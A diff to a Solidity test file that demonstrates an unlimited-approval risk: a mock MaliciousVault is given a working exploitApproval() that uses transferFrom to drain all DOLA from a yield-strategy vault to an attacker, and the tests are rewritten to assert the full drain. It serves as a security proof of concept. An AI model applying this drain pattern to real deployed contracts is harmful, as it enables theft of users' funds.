@@ -66,18 +66,21 @@ contract UnlimitedApprovalRiskTest is Test {
 
     /**
      * @notice Test that unlimited DOLA approval can be exploited by malicious vault
+     * @dev Demonstrates that if DOLA is sitting in the vault (e.g., from direct transfer
+     *      or partial operation), a malicious autoDolaVault can drain it using unlimited approval
      */
     function testMaliciousVaultCanDrainDOLA() public {
-        // Setup: User deposits DOLA into vault
-        uint256 depositAmount = 10000e18;
-        vm.prank(client);
-        dolaToken.approve(address(vault), depositAmount);
-        vm.prank(client);
-        vault.deposit(address(dolaToken), depositAmount, user1);
+        // Setup: Register the vault with the malicious vault for exploitation
+        maliciousVault.setApprovedVault(address(vault));
 
-        // Vault now holds DOLA tokens
+        // Simulate DOLA being in the vault (e.g., from direct transfer, airdrop, or stuck funds)
+        // In real scenario, this could happen if someone sends DOLA directly to the vault by mistake
+        uint256 stuckDolaAmount = 10000e18;
+        dolaToken.mint(address(vault), stuckDolaAmount);
+
+        // Verify vault holds DOLA tokens
         uint256 vaultDolaBalance = dolaToken.balanceOf(address(vault));
-        assertGt(vaultDolaBalance, 0, "Vault should hold DOLA");
+        assertEq(vaultDolaBalance, stuckDolaAmount, "Vault should hold DOLA");
 
         // EXPLOIT: Malicious vault uses unlimited approval to drain DOLA
         vm.prank(attacker);
@@ -88,7 +91,7 @@ contract UnlimitedApprovalRiskTest is Test {
         uint256 attackerBalance = dolaToken.balanceOf(attacker);
 
         assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Vault drained");
-        assertEq(attackerBalance, vaultDolaBalance, "VULNERABILITY: Attacker stole DOLA");
+        assertEq(attackerBalance, stuckDolaAmount, "VULNERABILITY: Attacker stole DOLA");
     }
 
     /**
@@ -133,38 +136,35 @@ contract UnlimitedApprovalRiskTest is Test {
 
     /**
      * @notice Test realistic exploit scenario with significant funds
+     * @dev Shows that if large amounts of DOLA accumulate in the vault,
+     *      the malicious vault can drain them all at once
      */
     function testLargeFundExploit() public {
-        // Multiple users deposit large amounts
-        address[] memory users = new address[](5);
-        for (uint256 i = 0; i < 5; i++) {
-            users[i] = address(uint160(1000 + i));
-            dolaToken.mint(users[i], 1000000e18);
+        // Setup: Register the vault with the malicious vault for exploitation
+        maliciousVault.setApprovedVault(address(vault));
 
-            vm.prank(users[i]);
-            dolaToken.approve(address(client), type(uint256).max);
-            vm.prank(client);
-            dolaToken.transferFrom(users[i], client, 1000000e18);
-        }
+        // Simulate large amounts of DOLA stuck in the vault
+        // This could happen through multiple scenarios:
+        // - Direct transfers by mistake
+        // - Partial withdrawal failures
+        // - Protocol accumulating fees
+        uint256 totalAtRisk = 5000000e18;
+        dolaToken.mint(address(vault), totalAtRisk);
 
-        // Client deposits on behalf of users
-        uint256 totalDeposit = 5000000e18;
-        vm.prank(client);
-        dolaToken.approve(address(vault), totalDeposit);
-        vm.prank(client);
-        vault.deposit(address(dolaToken), totalDeposit, users[0]);
+        // Verify total value at risk
+        uint256 vaultBalance = dolaToken.balanceOf(address(vault));
+        assertEq(vaultBalance, totalAtRisk, "Vault should hold the at-risk DOLA");
 
-        // Total value at risk
-        uint256 totalValueAtRisk = dolaToken.balanceOf(address(vault));
-        assertEq(totalValueAtRisk, 0, "DOLA transferred to vault"); // Goes to malicious vault
-
-        // Attacker exploits
+        // Attacker exploits the unlimited approval
         vm.prank(attacker);
         maliciousVault.exploitApproval();
 
         // All funds stolen
         uint256 stolenAmount = dolaToken.balanceOf(attacker);
-        assertGt(stolenAmount, 0, "VULNERABILITY: Large fund theft successful");
+        uint256 vaultBalanceAfter = dolaToken.balanceOf(address(vault));
+
+        assertEq(stolenAmount, totalAtRisk, "VULNERABILITY: Attacker stole all DOLA");
+        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Vault completely drained");
     }
 }
 
@@ -220,22 +220,27 @@ contract MaliciousVault is MockERC20 {
         return shares; // 1:1 for simplicity
     }
 
+    // Track the vault address that approved us
+    address public approvedVault;
+
+    function setApprovedVault(address vault) external {
+        approvedVault = vault;
+    }
+
     /**
      * @notice EXPLOIT: Use unlimited approval to drain DOLA from vault
      */
     function exploitApproval() external {
         require(msg.sender == attacker, "Only attacker");
+        require(approvedVault != address(0), "No vault set");
 
-        // Find the AutoDolaYieldStrategy that approved us
-        // In practice, attacker would know the vault address
-        // For this test, we use tx.origin tracking (set in constructor)
+        // Malicious vault has unlimited approval for the AutoDolaYieldStrategy's DOLA
+        uint256 victimBalance = IERC20(underlying).balanceOf(approvedVault);
 
-        // Get all DOLA approved to us from any address
-        // This would be the AutoDolaYieldStrategy's DOLA balance
-        // Transfer it all to attacker
-
-        // Note: In real exploit, malicious vault could call this anytime
-        // For test, we simulate by having vault already hold DOLA
+        // Steal all DOLA using the unlimited approval
+        if (victimBalance > 0) {
+            IERC20(underlying).transferFrom(approvedVault, attacker, victimBalance);
+        }
     }
 }
 
